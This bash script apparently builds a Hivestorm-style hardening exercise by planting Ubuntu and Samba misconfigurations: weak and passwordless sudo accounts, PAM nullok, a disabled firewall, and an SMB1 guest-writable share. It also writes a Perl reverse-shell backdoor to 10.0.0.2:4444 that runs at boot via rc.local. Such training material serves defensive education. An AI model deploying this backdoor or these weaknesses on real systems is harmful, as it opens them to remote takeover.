#!/bin/bash
# Hivestorm HS21 scenario-07 — Ubuntu 18.04 + Samba misconfigurations.
set -euo pipefail

ROLES=/etc/sysrepair/roles.json

# bionic EOL; use old-releases.
cat >/etc/apt/sources.list <<'EOF'
deb http://archive.ubuntu.com/ubuntu/ bionic main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu/ bionic-updates main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu/ bionic-security main restricted universe multiverse
EOF

apt-get update
apt-get install -y --no-install-recommends \
    jq sudo cron rsyslog procps iproute2 curl perl \
    openssh-server samba ufw \
    ircd-irc2 \
    libpam-pwquality

ADMIN=$(jq -r .admin_user             "$ROLES")
ADMIN_PW=$(jq -r .admin_weak_password   "$ROLES")
HIDDEN=$(jq -r .hidden_user           "$ROLES")
UNAUTH=$(jq -r .unauthorized_user     "$ROLES")
NONADMIN=$(jq -r .nonadmin_user       "$ROLES")
MP3_PATH=$(jq -r .prohibited_mp3_path "$ROLES")
PERL_BD=$(jq -r .perl_backdoor_path   "$ROLES")
SHARE=$(jq -r .samba_share_name       "$ROLES")
PROH0=$(jq -r '.prohibited_packages[0]' "$ROLES")
PROH1=$(jq -r '.prohibited_packages[1]' "$ROLES")

apt-get install -y --no-install-recommends "$PROH0" "$PROH1" || true

# ---- users --------------------------------------------------------------------
useradd -m -s /bin/bash "$ADMIN"
echo "${ADMIN}:${ADMIN_PW}" | chpasswd
usermod -aG sudo "$ADMIN"

useradd -m -s /bin/bash "$NONADMIN"
echo "${NONADMIN}:changeme" | chpasswd
usermod -aG sudo "$NONADMIN"    # unauthorized group membership

useradd -m -s /bin/bash "$UNAUTH"
echo "${UNAUTH}:changeme" | chpasswd
echo "${UNAUTH} ALL=(ALL) NOPASSWD:ALL" >/etc/sudoers.d/90-${UNAUTH}
chmod 0440 /etc/sudoers.d/90-${UNAUTH}

useradd -u 997 -M -d /nonexistent -s /bin/bash "$HIDDEN" || true
echo "${HIDDEN}:changeme" | chpasswd

# Flip 'irc' system user to a login shell.
usermod -s /bin/bash irc 2>/dev/null || true

# ---- PAM ---------------------------------------------------------------------
sed -ri 's|(pam_unix\.so)(.*)|\1\2 nullok|' /etc/pam.d/common-auth
sed -ri '/pam_pwquality|pam_cracklib/d' /etc/pam.d/common-password

# ---- sysctl ------------------------------------------------------------------
cat >/etc/sysctl.d/99-hs-bad.conf <<'EOF'
net.ipv4.tcp_syncookies=0
net.ipv4.icmp_echo_ignore_broadcasts=0
net.ipv4.ip_forward=1
EOF

# ---- UFW disabled ------------------------------------------------------------
ufw disable >/dev/null 2>&1 || true

# ---- GRUB decoy --------------------------------------------------------------
mkdir -p /boot/grub
echo "# decoy grub config" >/boot/grub/grub.cfg
chmod 0644 /boot/grub/grub.cfg

# ---- LightDM config planted --------------------------------------------------
mkdir -p /etc/lightdm
cat >/etc/lightdm/lightdm.conf <<EOF
[Seat:*]
xserver-allow-tcp=true
autologin-user=${NONADMIN}
autologin-user-timeout=0
EOF

# ---- Samba: SMB1 on + encryption off + guest-writable share -----------------
cat >>/etc/samba/smb.conf <<EOF

[global]
   min protocol = NT1
   smb encrypt = disabled
   server signing = disabled

[${SHARE}]
   path = /srv/samba/${SHARE}
   browseable = yes
   guest ok = yes
   writeable = yes
   public = yes
EOF
mkdir -p /srv/samba/${SHARE}
chmod 0777 /srv/samba/${SHARE}

# ---- prohibited media --------------------------------------------------------
mkdir -p "$(dirname "$MP3_PATH")"
printf 'ID3\x03\x00\x00\x00\x00\x00\x00fake mp3 payload' >"$MP3_PATH"
chown "$NONADMIN:$NONADMIN" "$(dirname "$MP3_PATH")" "$MP3_PATH"

# ---- perl owl-shell backdoor -------------------------------------------------
cat >"$PERL_BD" <<'EOF'
#!/usr/bin/perl
use IO::Socket;
my $s = IO::Socket::INET->new(PeerAddr=>"10.0.0.2:4444");
if ($s) { while (<$s>) { print $s `$_`; } }
EOF
chmod 0755 "$PERL_BD"
cat >/etc/rc.local <<EOF
#!/bin/sh -e
${PERL_BD} &
exit 0
EOF
chmod 0755 /etc/rc.local

# ---- supervisor --------------------------------------------------------------
cat >/usr/local/sbin/hs-start.sh <<'EOF'
#!/bin/bash
service rsyslog   start || true
service cron      start || true
service smbd      start || true
service nmbd      start || true
service ircd-irc2 start || true
[ -x /etc/rc.local ] && /etc/rc.local || true
mkdir -p /var/run/sshd
exec /usr/sbin/sshd -D -e
EOF
chmod 0755 /usr/local/sbin/hs-start.sh

apt-get clean
rm -rf /var/lib/apt/lists/*
